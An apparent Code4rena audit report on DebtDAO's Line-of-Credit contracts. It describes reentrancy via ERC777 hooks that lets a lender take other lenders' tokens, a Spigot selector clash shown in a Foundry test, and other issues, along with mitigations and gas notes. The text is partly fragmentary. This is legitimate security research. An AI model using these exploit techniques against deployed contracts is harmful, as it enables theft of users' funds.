*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160), also found by [SmartSek](https://github.com/code-423n4/2022-11-debtdao-findings/issues/498), [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/451), and [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/297)*

A reentrancy bug in `LineOfCredit.sol` allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds).

The  reentrancy occurs in the `_close(credit, id)` function in `LineOfCredit.sol`. The `credit[id]` state variable is cleared only after sendings tokens to the lender.

<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483>

        function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
            if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }

            // return the Lender's funds that are being repaid
            if (credit.deposit + credit.interestRepaid > 0) {
                LineLib.sendOutTokenOrETH(
                    credit.token,
                    credit.lender,
                    credit.deposit + credit.interestRepaid
                );
            }

            delete credits[id]; // gas refunds

            // remove from active list
            ids.removePosition(id);
            unchecked { --count; }

            // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.
            if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }

            emit CloseCreditPosition(id);

            return true;
        }

### Proof of Concept

Reentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.
Example of a real-world popular token that can change control flow is PNT (pNetwork).

As the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.

If a reentrancy occurs in the `_close(credit, id)` function, the `credit[id]` state variable is cleared only after sendings tokens to the lender.
A lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`. A lender can repeat these processes as long as LineOfCredit has funds available.

The POC will demonstrate the following flow:

1.  Borrower  adds a new credit with lender1 on 1000 tokens.
2.  Borrower lends 1000 from lender1
3.  Borrower repays debt
4.  Borrower adds a new credit with lender2 on 1000 tokens
5.  Borrower closes debt with lender1
6.  Lender1 receives 2000 tokens.

        //validate that lender1 was able to steal lender2 tokens
        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);
    }
```

To run the POC execute:
`forge test -v`

Expected output:

    [PASS] test_reentrancy() (gas: 1636410)
    Test result: ok. 1 passed; 0 failed; finished in 1.71ms

To get full trace execute:
`forge test -vvvv`

### Tools Used

VS Code, Foundry.

### Recommended Mitigation Steps

Send tokens only at the end of `_close(Credit memory credit, bytes32 id)` or add a reentrancyGuard.

> That line of reasoning doesn't hold up. The user should be protected against accidentally allowing a token that has a reentrancy attack vector. There is not an immediate and obvious difference between ERC777 and ERC20 tokens. This issue has been a viable Medium risk going all the way back to Uniswap V2 (or possibly before).

## [[M-06] The lender can draw out extra credit token from borrower's account](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176)
*Submitted by [KingNFT](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176), also found by [\_\_141345\_\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/337), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/332), and [Ch\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/311)*

<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>

<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488>

### Impact

When the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower's account. And the `count` state variable would also be underflowed, cause the line contract can't be 'REPAID', the borrower will never be able to get back the collateral.

P.S.

[Similar attack on imBTC](https://zengo.com/imbtc-defi-hack-explained)

### Proof of Concept

The vulnerable point is in `\_close()` function,

    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
        // ...
        if (credit.deposit + credit.interestRepaid > 0) {
            LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here
                credit.token,
                credit.lender,
                credit.deposit + credit.interestRepaid
            );
        }
        // ...
    }

The following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under 'test' directory, it will pass

## [[M-07] Whitelisted functions aren't scoped to revenue contracts and may lead to unnoticed calls due to selector clashing](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312)
*Submitted by [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/312), also found by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/474), [bin2chen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/285), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/276), [Ruhum](https://github.com/code-423n4/2022-11-debtdao-findings/issues/180), and [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/71)*

<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67>

<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14>

Whitelisted functions in the Spigot contract don't have any kind of association or validation to which revenue contract they are intended to be used. This may lead to inadvertently whitelisting a function in another revenue contract that has the same selector but a different name (signature).

### Impact

Functions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not difficult) to find different functions that have the same selector.

In this way, a bad actor can try to use an innocent looking function that matches the selector of another function (in a second revenue contract) that has malicious intentions. The arbiter will review the innocent function, whitelist its selector, while unknowingly enabling a potential call to the malicious function, since whitelisted functions can be called on any revenue contract.

Mining for selector clashing is feasible since selectors are 4 bytes and the search space isn't that big for current hardware.

This is similar to the attack found on proxies, documented [here](https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357) and [here](https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070).

### Proof of Concept

In the following test, the `collate_propagate_storage(bytes16)` function is whitelisted because it looks safe enough to the arbiter. Now, `collate_propagate_storage(bytes16)` has the same selector as `burn(uint256)`, which allows a bad actor to call `EvilRevenueContract.burn` using the `operate` function of the Spigot.

Note: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.

    contract InnocentRevenueContract {
        function collate_propagate_storage(bytes16) external {
            // It's all safe here!
            console.log("Hey it's all good here");
        }
    }

    contract EvilRevenueContract {
        function burn(uint256) external {
            // Burn the world!
            console.log("Boom!");
        }
    }

    function test_WhitelistFunction_SelectorClash() public {
          vm.startPrank(owner);
          
          spigot = new Spigot(owner, treasury, operator);
          
          // Arbiter looks at InnocentRevenueContract.collate_propagate_storage and thinks it's safe to whitelist it (this is a simplified version, in a real deploy this comes from the SpigotedLine contract)
          spigot.updateWhitelistedFunction(InnocentRevenueContract.collate_propagate_storage.selector, true);
          assertTrue(spigot.isWhitelisted(InnocentRevenueContract.collate_propagate_storage.selector));
          
          // Due to selector clashing EvilRevenueContract.burn gets whitelisted too!
          assertTrue(spigot.isWhitelisted(EvilRevenueContract.burn.selector));
          
          
          EvilRevenueContract evil = new EvilRevenueContract();
          // ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);
          // require(spigot.addSpigot(address(evil), settings), "Failed to add spigot");
          
          vm.stopPrank();
                  
          // And we can call it through operate...
          vm.startPrank(operator);
          spigot.operate(address(evil), abi.encodeWithSelector(EvilRevenueContract.burn.selector, type(uint256).max));
      }

### Recommendation

Associate whitelisted functions to particular revenue contracts (for example, using a `mapping(address => mapping(bytes4 => bool))`) and validate that the selector for the call is enabled for that specific revenue contract in the `operate` function.

## [[M-08] Mistakenly sent eth could be locked](https://github.com/code-423n4/2022-11-debtdao-findings/issues/355)

If ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked.

There are several functions that could be affected and cause user fund lock:

*   `addCollateral()`
*   `addCredit()`
*   `increaseCredit()`
*   `depositAndClose()`
*   `depositAndRepay()`
*   `close()`

### Proof of Concept

In `receiveTokenOrETH()`, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract.

```solidity
// Line-of-Credit/contracts/utils/LineLib.sol
    function receiveTokenOrETH(
      address token,
      address sender,
      uint256 amount
    )
      external
      returns (bool)
    {
        if(token == address(0)) { revert TransferFailed(); }
        if(token != Denominations.ETH) { // ERC20
            IERC20(token).safeTransferFrom(sender, address(this), amount);
        } else { // ETH
            if(msg.value < amount) { revert TransferFailed(); }
        }
        return true;
    }
```

### Recommended Mitigation Steps

In the ERC20 part, add check for `msg.value` to ensure no eth is sent:

```solidity
        if(token != Denominations.ETH) { // ERC20
            if (msg.value > 0) { revert TransferFailed(); }
            IERC20(token).safeTransferFrom(sender, address(this), amount);
        } else { // ETH
```

### Impact

Some ERC20 may be tricky for the balance. Such as:

*   fee on transfer (STA, USDT also has this mode)
*   rebasing (aToken from AAVE)
*   variable balance (stETH, balance could go up and down)

For these tokens, the balance can change over time, even without `transfer()/transferFrom()`. But current accounting stores the spot balance of the asset.

The impacts include:

*   the calculation of collateral value could be inaccurate
*   protocol could lose funds due to the deposit/repay amount being less than the actual transferred amount after fee
*   the amount user withdraw collateral when `_close()` will be inaccurate
    *   some users could lose funds due to under value
    *   some funds could be locked due to the balance inflation
    *   some funds might be locked due to the balance deflation

### Proof of Concept

The spot new deposit amount is stored in the mapping `self.deposited[token].amount` and `credit.deposit`, and later used to calculate the collateral value and withdraw amount.

```solidity
// Line-of-Credit/contracts/utils/EscrowLib.sol
    function addCollateral(EscrowState storage self, address oracle, uint256 amount, address token) {
        // ...
        LineLib.receiveTokenOrETH(token, msg.sender, amount);

        self.deposited[token].amount += amount;
        // ...
    }

    function _getCollateralValue(EscrowState storage self, address oracle) public returns (uint256) {
            // ...
            d = self.deposited[token];
                // ...
                collateralValue += CreditLib.calculateValue(
                  o.getLatestAnswer(d.asset),
                  deposit,
                  d.assetDecimals
                );
            // ...
    }

// Line-of-Credit/contracts/modules/credit/LineOfCredit.sol
    function increaseCredit(bytes32 id, uint256 amount) {
        // ...
        Credit memory credit = credits[id];
        credit = _accrue(credit, id);

        credit.deposit += amount;
        
        credits[id] = credit;

        LineLib.receiveTokenOrETH(credit.token, credit.lender, amount);

        // ...
    }

    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
        // ...
        if (credit.deposit + credit.interestRepaid > 0) {
            LineLib.sendOutTokenOrETH(
                credit.token,
                credit.lender,
                credit.deposit + credit.interestRepaid
            );
        }
```

However, if the balance changed later, the returned collateral value will be inaccurate. And the amount used when withdraw collateral in `_close()` is also wrong.

### Recommended Mitigation Steps

*   checking the before and after balance of token transfer
*   recording the relative shares of each user instead of specific amount
*   if necessary, call `ERC20(token).balanceOf()` to confirm the balance
*   disallow such kind of tokens

When withdrawing and refund  ETH, the  contract uses Solidityâ€™s `transfer()` function.

Using Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when:

*   The withdrawer smart contract does not implement a payable fallback function.
*   The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units.
*   The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the callâ€™s gas usage above 2300.

Risks of reentrancy stemming from the use of this function can be mitigated by tightly following the "Check-Effects-Interactions" pattern and using OpenZeppelin Contractâ€™s ReentrancyGuard contract. 

### Proof of Concept

```solidity
// Line-of-Credit/contracts/utils/LineLib.sol
48:    payable(receiver).transfer(amount);
```

#### References:

The issues with `transfer()` are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/).

For further reference on why using Solidityâ€™s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).

### Recommended Mitigation Steps

Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).

## [[M-11] Lender can reject closing a position](https://github.com/code-423n4/2022-11-debtdao-findings/issues/467)
*Submitted by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/467), also found by [R2](https://github.com/code-423n4/2022-11-debtdao-findings/issues/390), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/352), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/264), [ayeslick](https://github.com/code-423n4/2022-11-debtdao-findings/issues/170), and [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/85)*

A credit line can be closed by using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close`. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender.

However, if the used credit token `credit.token` is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.

### Impact

The lender can prevent the borrower from closing the credit line. This leads to the following consequences:

*   Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see [SecuredLine.sol#L55](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55))
*   Releasing a spigot and transferring ownership to the borrower is not possible (see [SpigotedLineLib.sol#L195](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195))
*   Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see [SpigotedLineLib.sol#L220](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220>))

}
```

### Recommended Mitigation Steps

Consider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly.

## Low Risk Issues Summary
| |Issue|Instances|

Total: 8 instances over 3 issues

## [L&#x2011;01]  Unused/empty `receive()`/`fallback()` function

If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds.

## [N&#x2011;01]  Duplicate import statements

*There is 1 instance of this issue:*
```solidity
File: contracts/utils/CreditLib.sol

6:    import { ILineOfCredit } from "../interfaces/ILineOfCredit.sol";

```
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L6

## [N&#x2011;02]  The `nonReentrant` `modifier` should occur before all other modifiers

This is a best-practice to protect against reentrancy in other modifiers.

*There are 2 instances of this issue:*
```solidity
File: contracts/modules/credit/SpigotedLine.sol

96:           nonReentrant

157:          nonReentrant

```
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L96

## [N&#x2011;03]  Contract implements interface without extending the interface

Not extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the `override` keyword to indicate that fact.

*There is 1 instance of this issue:*
```solidity
File: contracts/modules/spigot/Spigot.sol

/// @audit IPendleData.treasury()
16:   contract Spigot is ISpigot, ReentrancyGuard {

```
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16

## [N&#x2011;04]  Adding a `return` statement when the function defines a named return variable, is redundant

*There are 5 instances of this issue:*

## [N&#x2011;06]  `constant`s should be defined rather than using magic numbers

Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.

## [N&#x2011;07]  Numeric values having to do with time should use time units for readability

There are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used.

*There is 1 instance of this issue:*

## [N&#x2011;10]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)

While the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist.

## [N&#x2011;11]  Constant redefined elsewhere

Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.

## [N&#x2011;16]  Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

## [N&#x2011;19]  Return values of `approve()` not checked
Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything

Total: 84 instances over 16 issues with **21688 gas** saved

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.

## [G&#x2011;01]  State variables only set in the constructor should be declared `immutable`

Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). 

While `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.

*There are 2 instances of this issue:*
```solidity
File: contracts/modules/oracle/Oracle.sol

/// @audit registry (constructor)
16:           registry = FeedRegistryInterface(_registry);

/// @audit registry (access)
29:           ) = registry.latestRoundData(token, Denominations.USD);

```

## [G&#x2011;02]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas

When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. 

If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one

Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved

## [G&#x2011;03]  Using `storage` instead of `memory` for structs/arrays saves gas

When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct

## [G&#x2011;04]  Avoid contract existence checks by using low level calls

Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence

## [G&#x2011;05]  State variables should be cached in stack variables rather than re-reading them from storage

The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.

## [G&#x2011;10]  Optimize names to save gas

`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).

## [G&#x2011;11]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead
> When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.

https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html
Each operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.

If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.

## [G&#x2011;13]  Inverting the condition of an `if`-`else`-statement wastes gas

## [G&#x2011;14]  `require()` or `revert()` statements that check input arguments should be at the top of the function

Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.

## [G&#x2011;15]  Use custom errors rather than `revert()`/`require()` strings to save gas

Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.

## [G&#x2011;16]  Functions guaranteed to revert when called by normal users can be marked `payable`

If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are 
`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.

These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness

## Gas Optimizations Summary
| |Issue|Instances|Total Gas Saved|
|-|:-|:-:|:-:|
| [G&#x2011;17] | Using `bool`s for storage incurs overhead | 1 | 17100 |
| [G&#x2011;18] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 3 | 18 |

Total: 4 instances over 2 issues with **17118 gas** saved

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.

## [G&#x2011;17]  Using `bool`s for storage incurs overhead
```solidity
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past

## [G&#x2011;18]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement

The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.
